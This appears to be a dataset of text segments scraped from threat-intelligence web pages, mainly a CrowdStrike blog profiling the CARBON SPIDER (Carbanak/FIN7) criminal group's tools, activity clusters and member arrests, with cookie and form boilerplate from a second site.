[
    {
        "text": "The Windows Restart Manager: How It Works and How It Can Be Hijacked, Part 2\n\n09/01/2023\n\n\n\n\n  The Windows Restart Manager: How It Works and How It Can Be Hijacked, Part 1\n\n08/25/2023\n\n\n\n\n ",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The Windows Restart Manager: How It Works and How It Can Be Hijacked, Part 2\n\n09/01/2023\n\n\n\n\n  The Windows Restart Manager: How It Works and How It Can Be Hijacked, Part 1\n\n08/25/2023\n\n\n\n\n ",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Dmytro Fedorov, 44, Fedir Hladyr, 33, and Andrii Kopakov, 30, are suspected to be key members within CARBON SPIDER\u2019s point of sale (POS) subgroup.\n ",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The arrests took place between January and June 2018, and coincided with a slowdown in CARBON SPIDER activity.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The DoJ announcement also details the group\u2019s use of a front company, named Combi Security, to recruit developers and intrusion specialists for its operations.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Given that other members of this subgroup remain at large, it is likely that the tactics, techniques and procedures (TTPs) may change but activity will continue.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "CARBON SPIDER, more widely known as the Carbanak group, is a long-standing criminal enterprise responsible for compromising banks to transfer funds to mule accounts, performing ATM jackpotting attacks, and conducting mass compromise of debit and credit cards from POS terminals in large enterprises.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "During that time, the group has focused on the banking, financial, media, technology, hospitality, and food and beverage verticals, using targeted campaigns to reach their objectives.\n Untangling the CARBON SPIDER Web\nThe structure of CARBON SPIDER is very complex and was initially suspected to be a single group, based on their use of several custom tools and specific TTPs. However, further research into the structure indicates that there are several clusters of activity likely made up of subgroups serving different missions, potentially with access to a shared development environment and pool of resources. A complex structure such as this is difficult to manage and speaks to the sophistication of the actor.\n This blog aims to examine CARBON SPIDER over time and attempts to describe their changing relationship within the eCrime ecosystem.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Custom Tools\nCARBON SPIDER has leveraged many custom tools since it began activity in 2013, including its primary implant Sekur (a.k.a. Anunak). These include the following:\nSekur\n\n\n\nName\nSekur\n\n\nAliases\nAnunak and Carbanak RAT\n\n\nFirst Seen\nFebruary 2014 (based on compile time)\n\n\nLast Seen\nNovember 2017 (based on compile time)\n\n\n Purpose\nPrimary remote access toolkit (RAT) for monitoring victim systems of interest\n\n\nType\nMicrosoft Windows executable\n\n\nExample Hash\nf70cef297efe9ec0abea369b3c1235f14220a6165b48f6e8aa054296078122c8\n\n\nFalcon EPP protection\nMachine learning: Cloud-based, on-sensor indicators of attack(IOAs): Suspicious activity\n\n\nMITRE ATT&CK\u2122 technique analysis from Hybrid Analysis\n\n\n\n\n\u00a0\nSekur has been CARBON SPIDER\u2019s primary tool for several years, although usage over the last year appears to have declined.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It contains all the functionality you would expect from a RAT, allowing the adversary to execute commands, manage the file system, manage processes, and collect data. In addition, it can record videos of victim sessions, log keystrokes, enable remote desktop, or install Ammyy Admin or VNC modules. From July 2014 on, samples were compiled with the capability to target Epicor POS systems and to collect credit card data.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Agent ORM\n\n\n\nName\nAgent ORM\n\n\nAliases\nToshliph and DRIFTPIN\n\n\nFirst Seen\nJune 2015 (based on compile time)\n\n\n Last Seen\nMay 2016 (based on compile time)\n\n\n Purpose\nFirst-stage information collection and downloading next-stage payloads\n\n\nType\nMicrosoft Windows executable\n\n\nExample Hash\n36937e5e744873b3646c9d345e8cf50fb969029dc77525acfe63d5a9d28b73f2\n\n\nFalcon EPP protection\nMachine learning: Cloud-based, on-sensor\u00a0IOAs: Suspicious activity\n\n\nMITRE ATT&CK\u2122 technique analysis from Hybrid Analysis\n\n\n\n\n\u00a0\nAgent ORM began circulating alongside Sekur in campaigns throughout the second half of 2015.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The malware collects basic system information and is able to take screenshots of victim systems.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is strongly suspected that Agent ORM has been deprecated in favor of script-based first-stage implants (VB Flash, JS Flash, and Bateleur).\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "VB Flash\n\n\n\nName\nVB Flash\n\n\nAliases\nHALFBAKED\n\n\nFirst Seen\nSeptember 2015 (based on observed distribution)\n\n\nLast Seen\nMay 2017 (based on observed distribution)\n\n\n Purpose\nFirst-stage information collection and downloading next-stage payloads\n\n\nType\nVBScript\n\n\nExample Hash\na7a927bd44040817ae39e15aeb3f0b69ca943d4ce5b00d12eed6fae5b1c325d0\n\n\nFalcon EPP protection\nIOAs: Attacker methodology;",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Suspicious activity\n\n\n\n\u00a0\nVB Flash was first observed being deployed alongside Agent ORM in September 2015. It is likely that this was developed as a replacement to Agent ORM and contained similar capabilities. The first observed instance of VB Flash included comments and was easy to analyze\u2014later versions soon began to integrate multiple layers of obfuscation.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Several versions of VB Flash were developed including ones that utilized Google Forms, Google Macros, and Google Spreadsheets together to make a command-and-control (C2) channel. This variant would POST victim data to a specified Google form, then make a request to a Google macro script, receiving an address for a Google Spreadsheet from which to request commands.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "JS Flash\n\n\n\nName\nJS Flash\n\n\nAliases\nJavaScript variant of HALFBAKED\n\n\nFirst Seen\nMay 2017 (based on observed distribution)\n\n\nLast Seen\nNovember 2017 (based on observed distribution)\n\n\n Purpose\nFirst-stage information collection and downloading next-stage payloads\n\n\nType\nJavaScript\n\n\nExample Hash\nffebcc4d2e851baecd89bf11103e3c9de86f428fdeaf0f8b33d9ea6f5ef56685\n\n\nFalcon EPP protection\nIOAs: Attacker methodology; Suspicious activity\n\n\n\n\u00a0\nJS Flash capabilities closely resemble those of VB Flash and leverage interesting techniques in deployment via batch scripts embedded as OLE objects in malicious documents.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Many iterations of JS Flash were observed being tested before deployment, containing minor changes to obfuscation and more complex additions, such as the ability to download TinyMet (a cutdown of the Metasploit Meterpreter payload). PowerShell was also used heavily for the execution of commands and arbitrary script execution.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Bateleur\n\n\n\nName\nBateleur\n\n\nAliases\nN/A\n\n\nFirst Seen\nJune 2017 (based on observed distribution)\n\n\nLast Seen\nApril 2018 (based on observed distribution)\n\n\n Purpose\nFirst-stage information collection and downloading next-stage payloads\n\n\nType\nJavaScript\n\n\nExample Hash\nda70df51aa80414fcba9bf7322e44e8ea5ed6a3725f342cd05c733376c6f2121\n\n\nFalcon\nEPP protection\nIOAs: Malicious document; Establishing persistence.\n\n\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "ATT&CK\u2122 technique analysis from Hybrid Analysis\n\n\n\n\n\u00a0\nBateleur deployments began not long after JS Flash and were also written in JavaScript.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is likely that Bateleur was run in parallel as an alternative tool and eventually replaced JS Flash as CARBON SPIDER\u2019s first stage tool of choice. Although much simpler in design than JS Flash, all executing out of a single script with more basic obfuscation, Bateleur has a wealth of capabilities\u2014including the ability to download arbitrary scripts and executables, deploy TinyMet, execute commands via PowerShell, deploy a credential stealer, and collect victim system information such as screenshots.\n Clusters of Activity\nBased on the use of these tools, it is possible to group the CARBON SPIDER activity into several clusters. These clusters may represent different groups with a common tool supply chain, or isolated campaigns from the same group, using separate individuals to carry out attacks with a different focus.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Targeting\n\n\n\nTarget Region\nPrimarily U.S. and Western Europe\n\n\nTarget Sector\nEnterprises that process many card transactions (in particular casinos, hotels, and restaurant chains)\n\n\nActive From\nAt least mid 2015\n\n\nActive To\nCurrent\n\n\n\n\u00a0\nThe POS cluster is the most prolific associated to the CARBON SPIDER actor and is also known as FIN7.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This cluster has used all the custom tools described with VB Flash, JS Flash, and Bateleur that are unique to them.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Over time, they have used targeted spear phishing emails to deploy malicious documents that initially used exploits; more recently, they have used macros and OLE embedded objects.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The primary method of cash out for this group is the acquisition and sale of credit and debit card dumps from POS devices. Many of the stolen cards are sold as collectives on the eCrime marketplace, Joker\u2019s Stash.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Targeting of Russian Financial Institutions\n\n\n\nTarget Region\nRussia\n\n\nTarget Sector\nFinancial and banking\n\n\nActive From\nLate 2013\n\n\nActive To\nEarly 2015\n\n\n\n\u00a0\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is suspected that they stole large sums of money using several cash out methods against Russian banks, at which point the group may have diverged. It is likely that they developed the primary CARBON SPIDER implant Sekur and were, at the point of being operational, probably the only users of it.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Targeting of Middle Eastern Financial Institutions\n\n\n\nTarget Region\nMiddle East and South Asia\n\n\nTarget Sector\nFinancial and banking\n\n\nActive From\nOctober 2014\n\n\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Active To\nActivity reported up to at least early 2016\n\n\n\n\u00a0\nAlthough the targeting profile is the same as the Russian banking cluster, the TTPs are very different.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "In particular, the use of tooling stands out from other clusters of CARBON SPIDER activity.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "As with other clusters, the primary infection vector is targeted spear phishing emails that use exploits for a variety of vulnerabilities in Microsoft Office:\n\nCVE-2015-2545\nCVE-2014-4114\nCVE-2015-1770\nCVE-2015-1641\n\nA custom .NET",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "first stage payload is deployed that in some cases deploys Agent ORM or Sekur, but is also used to deploy NetWire.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "downloader servers as their C2. One possibility is that CARBON SPIDER outsourced deployment of their malware for this campaign. An alternative theory is that this is a seperate group also using CARBON SPIDER tools.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Little is reported publicly about the successfulness of this cluster of activity, and no cash out methods are known.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Targeting of Eastern European Financial Institutions\n\n\n\nTarget Region\nUkraine and Eastern Europe\n\n\nTarget Sector\nLikely financial and banking\n\n\nActive From\nMid-2015\n\n\nActive To\nLast known activity in late 2015\n\n\n\n\u00a0\nThe Eastern European banking cluster is based on a single campaign using a strategic web compromise of an Italian bank in Ukraine to deploy instances of Agent ORM to likely Ukrainian targets.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is likely that this cluster links to one of the other clusters of Sekur activity, possibly the unattributed activity discussed below.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Unattributed\n\n\n\nTarget Region\nWhere known (appears to be Ukraine)\n\n\nTarget Sector\nNot known in most cases (one case focused on news and media organizations)\n\n\n Active From\nMay 2015\n\n\n Active To\nAt least January 2017\n\n\n\n\u00a0\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "The unattributed activity is based on a cluster of Sekur activity that runs in parallel with the POS cluster of activity, but does not exhibit the same TTPs (with differences in Sekur configuration, campaigns, and infrastructure selection). Many of these samples were submitted from Ukraine; additionally, one of them was deployed using a malicious document with a decoy that suggests Ukrainian news and media targeting. It is possible that this activity relates to the Eastern European bank cluster of Agent ORM activity; yet without further evidence of follow-on activity, it is not possible to determine this cluster\u2019s action on objectives.\n Timeline\nBelow is a timeline showing the activity of each of the five clusters of CARBON SPIDER activity:\n\nThe timeline shows that several of these clusters of activity started just after public reporting of the group (around mid-2015) and that the divergence in activity may have been the result of this exposure.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It also highlights that CARBON SPIDER now likely operates multiple parallel missions focusing on different regions and sectors.\n Links to Other Targeted eCrime Groups\nBeyond the described clusters of CARBON SPIDER activity based around their custom tools, their are also interesting links to other tracked, targeted eCrime activity. This includes the group dubbed RATPAK SPIDER (also known as Buhtrap) that targets Russian and Ukrainian financial institutions, a group dubbed Odinaff targeting SWIFT systems particularly in Eastern Europe, and the group COBALT SPIDER (also known as Cobalt) that, again, specializes in targeting Russian banks.\n RATPAK SPIDER\nOperation Buhtrap had a similar target scope (Russian financial) to the first cluster of CARBON SPIDER activity.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Although these have always been tracked as seperate groups, there is a technical link between payload deployments.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A custom macro dropper that would encode the payload using VB Script notation, and contained the strings \u201cAfter OnTime\u201d and \u201cFUCK AV,\u201d was observed in only 19 unique samples across Crowdstrike sample stores. One of the payloads was an instance of Agent ORM used to targeted casinos; a second payload also used by CARBON SPIDER was an instance of Sekur. The other six unique payloads observed being deployed using this custom macro dropper were instances of the Nullsoft Scriptable Install System (NSIS) downloader attributed to the Buhtrap group.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Although it now appears that Buhtrap is likely a separate entity, the use of this shared deployment mechanism \u2014 unique to these two groups \u2014 suggests a common supply chain or developer and a closer working relationship, especially given some similarities in target scope.\n Odinaff\nA SWIFT compromise was observed in mid-2016, targeting a Ukrainian bank that at the time was unattributed. Based on similar TTPs, it was hypothesised that this could be CARBON SPIDER activity; however, although common off-the-shelf tools (such as Meterpreter and Cobalt Strike) were used, the custom CARBON SPIDER arsenal was not present. Later, this group was reported in open source as Odinaff. In addition to similar TTPs, there appeared to be some infrastructure overlap with two IP addresses. One Odinaff C2 was also reported to be in previous use as a Sekur plugin server. A second IP was also reported to be used by CARBON SPIDER in a previous campaign.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Again, this may just be a shared hosting provider, but the TTP similarity makes this infrastructure overlap more noteworthy.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "COBALT SPIDER\nThe Cobalt group, tracked by CrowdStrike intelligence as COBALT SPIDER, bears many similarities in the targeting of banks to the Russian cluster of CARBON SPIDER activity. Both groups also use Cobalt Strike and several other pen-testing tools in their operations; nevertheless, the two groups appear to be distinct outside of this.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "On March 26, 2018, an announcement was made that a Russian citizen identified by authorities as \u201cDenis K.\u201d was arrested by the Spanish national police in Alicante, Spain. He was reportedly involved in early CARBON SPIDER targeting of Russian banks and is suspected of being one of the members of COBALT SPIDER. Although reports suggest that he may have been a leader of COBALT SPIDER, activity has continued from this group, suggesting his role was not a key one within this organization.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This is around the time that the dominant focus for CARBON SPIDER became targeting the POS systems of Western enterprises.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "It is possible that at least one individual left CARBON SPIDER and either joined forces with or created COBALT SPIDER.\n Summary\nCARBON SPIDER is the pioneer of targeted eCrime activity with some of the largest publicly attributed success. Their level of sophistication across the clusters of activity makes them a key player in the eCrime ecosystem. Although there is not enough evidence to directly link CARBON SPIDER to other targeted criminal groups, it is assessed with high confidence (based on analysis of artifacts and infrastructure over time) that CARBON SPIDER shares resources with other notable criminal groups.\n There are two possible hypotheses as to how the clusters of CARBON SPIDER activity are linked.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "One theory is that they were originally one group that splintered into several with different focuses.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Several of the splinter groups may have maintained access to their custom tools (e.g., Sekur), while others moved on to work with other actors (e.g., COBALT SPIDER).",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "A second theory is that CARBON SPIDER operates as distinct groups with different focuses, but they report to a single management structure.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Based on recently observed tooling and operations, CARBON SPIDER appears to be focusing their efforts on the POS cluster of activity against the hospitality and restaurant sector, with no recently reported activity against banks. They also appear to be moving away from their custom tooling, with no Sekur samples compiled since November 2017 and fewer samples appearing in live operations.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Going forward, it is likely that CARBON SPIDER will continue operations to target sectors that give the best financial return for their efforts. For the short term, this will likely mean a continued focus on POS systems and large enterprises that process them. It is possible that they may return to target banks, but this would likely be on a small scale with very focused operations.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "CARBON SPIDER will likely move completely away from their old custom toolset, either developing new tools or using commodity off-the-shelf packages to achieve their objectives. This is even more assured given the arrests of three members of the most prolific CARBON SPIDER subgroup.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "As CARBON SPIDER adversary groups retool and alter their TTPs CrowdStrike will continue to track this adversary leveraging CrowdStrike CrowdStrike Falcon\u00ae Intelligence\u00a0capabilities to combine endpoint protection, automation and malware analysis to prevent CARBON SPIDER from breaching our customer networks.\n To learn more about how to incorporate intelligence on threat actors like CARBON SPIDER into your security strategy, please visit the Falcon Intelligence product page.\n",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Download the CrowdStrike 2020 Global Threat Report\n\u00a0\n\n\n\n\n\n\nTweet\n\n\n\n\n\nShare\n\n\n\n\n\nRelated Content\n\n\n\n\n\n\n5 Tips to Defend Against Access Brokers This Holiday Season\n\n\n\n\n\n\n\n\nIMPERIAL KITTEN Deploys Novel Malware Families in Middle East-Focused Operations\n\n\n\n\n\n\n\n\nAutomation Advancements in Falcon Intelligence Recon: Disrupt the Adversary and Reduce Risk\n\n\n\n\n\n\n\n\n\n\n\n CrowdStrike Foundation Supports Next Generation of Talent in Cybersecurity\nCrowdStrike Summer Release Brings New Modules and Features to the Falcon Platform \n\n\n\n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nCopyright \u00a9 2023 CrowdStrike\nPrivacy\nRequest Info\nBlog\nContact Us\n1.888.512.8906\n\n\n\n\n\n\n\n\n\n\n\n\n\nCookie Preference CenterYour PrivacyStrictly Necessary CookiesFunctional CookiesPerformance CookiesTargeting CookiesYour PrivacyWhen you visit any website, it may store or retrieve information on your browser, mostly in the form of cookies.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This information might be about you, your preferences or your device and is mostly used to make the site work as you expect it to. The information does not usually directly identify you, but it can give you a more personalized web experience.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Because we respect your right to privacy, you can choose not to allow some types of cookies.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Click on the different category headings to find out more and change our default settings. However, blocking some types of cookies may impact your experience of the site and the services we are able to offer.\u00a0\n            ",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Strictly Necessary CookiesAlways ActiveThese cookies are necessary for the website to function and cannot be switched off in our systems.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This includes diagnostic functions such as identifying 404 errors and monitoring page load speed. They are usually only set in response to actions made by you which amount to a request for services, such as setting your privacy preferences, logging in or filling in forms.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "You can set your browser to block or alert you about these cookies, but some parts of the site will not then work. These cookies do not store any personally identifiable information.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Cookies Details\u200eFunctional Cookies  Functional Cookies These cookies enable the website to provide enhanced functionality and personalisation.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "They may be set by us or by third party providers whose services we have added to our pages.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies then some or all of these services may not function properly.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "These cookies allow us to count visits and traffic sources so we can measure and improve the performance of our site. They help us to know which pages are the most and least popular and see how visitors move around the site.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "If you do not allow these cookies we will not know when you have visited our site, and will not be able to monitor its performance.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "These cookies may be set through our site by our advertising partners. They may be used by those companies to build a profile of your interests and show you relevant adverts on other sites.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "They do not store directly personal information, but are based on uniquely identifying your browser and internet device.",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "Cookies Details\u200eBack ButtonBackSearch  Filter ButtonConsent Leg. Interest checkbox label label checkbox label label checkbox label labelEmpty headingEmpty headingView Third Party CookiesNamecookie nameClear checkbox label labelApply CancelConfirm My Choices Allow All",
        "source": "Arrests Put New Focus on CARBON SPIDER Adversary Group.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "\n\n\nNew Carbanak / Anunak Attack Methodology\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWhen you visit our website, we and our third-party service providers may use cookies and similar technologies to collect information about you.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "This information may be used to measure website usage and performance, optimize user experience, and provide targeted advertisements.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "For more information on our use of cookies and tracking technologies please review our Privacy PolicyCookie PreferencesAccept All CookiesDecline All Cookies\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrustwave SpiderLabs Uncovers Critical Cybersecurity Vulnerabilities Exposing Manufacturers to Costly Attacks.",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "24 HOUR HOTLINES\n                                    \n\n\n\n\n\n\n                                            AMERICAS\n                                          \n\n+1 855 438 4305\n                                            \n\n\n\n\n                                            EMEA\n                                          \n\n+44 8081687370\n                                            \n\n\n\n\n                                            AUSTRALIA\n                                          \n\n+61 1300901211\n                                            \n\n\n\n\n                                            SINGAPORE\n                                          \n\n+65 68175019\n                                            \n\n\n\n\n\nRecommended Actions\n                                      \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTrustwave SpiderLabs Uncovers Critical Cybersecurity Vulnerabilities Exposing Manufacturers to Costly Attacks. Learn More\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRequest a Demo\n                  \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nRequest a DemoFirst Name*Last Name*Company Name*Business Email*Country*Please SelectUnited StatesUnited KingdomAustraliaGermanyMexicoNew ZealandSingaporeOtherAfghanistan\u00c5land IslandsAlbaniaAlgeriaAmerican SamoaAndorraAngolaAnguillaAntarcticaAntigua and BarbudaArgentinaArmeniaArubaAsia/Pacific RegionAustriaAzerbaijanBahamasBahrainBangladeshBarbadosBelarusBelgiumBelizeBeninBermudaBhutanBoliviaBosnia and HerzegovinaBotswanaBouvet IslandBrazilBritish Indian Ocean TerritoryBritish Virgin IslandsBruneiBulgariaBurkina",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
        "text": "VerdeCaribbean NetherlandsCayman IslandsCentral African RepublicChadChileChinaChristmas IslandCocos (Keeling) IslandsColombiaComorosCongoCook IslandsCosta RicaCote d'IvoireCroatiaCubaCura\u00e7aoCyprusCzech RepublicDemocratic Republic of the CongoDenmarkDjiboutiDominicaDominican RepublicEast TimorEcuadorEgyptEl SalvadorEquatorial GuineaEritreaEstoniaEthiopiaEuropeFalkland IslandsFaroe IslandsFijiFinlandFranceFrench GuianaFrench PolynesiaFrench Southern and Antarctic LandsGabonGambiaGeorgiaGhanaGibraltarGreeceGreenlandGrenadaGuadeloupeGuamGuatemalaGuernseyGuineaGuinea-BissauGuyanaHaitiHeard Island and McDonald IslandsHondurasHong KongHungaryIcelandIndiaIndonesiaIranIraqIrelandIsle of ManIsraelItalyJamaicaJapanJerseyJordanKazakhstanKenyaKiribatiKosovoKuwaitKyrgyzstanLaosLatviaLebanonLesothoLiberiaLibyaLiechtensteinLithuaniaLuxembourgMacauMacedonia (FYROM)MadagascarMalawiMalaysiaMaldivesMaliMaltaMarshall IslandsMartiniqueMauritaniaMauritiusMayotteMicronesiaMoldovaMonacoMongoliaMontenegroMontserratMoroccoMozambiqueMyanmar (Burma)NamibiaNauruNepalNetherlandsNetherlands AntillesNew CaledoniaNicaraguaNigerNigeriaNiueNorfolk IslandNorth KoreaNorthern Mariana IslandsNorwayOmanPakistanPalauPalestinePanamaPapua New GuineaParaguayPeruPhilippinesPitcairn IslandsPolandPortugalPuerto RicoQatarR\u00e9unionRomaniaRussiaRwandaSaint Barth\u00e9lemySaint HelenaSaint Kitts and NevisSaint LuciaSaint MartinSaint Pierre and MiquelonSaint Vincent and the GrenadinesSamoaSan MarinoSao Tome and PrincipeSaudi ArabiaSenegalSerbiaSeychellesSierra",
        "source": "New Carbanak _ Anunak Attack Methodology.html",
        "detection": {},
        "prediction": {}
    },
    {
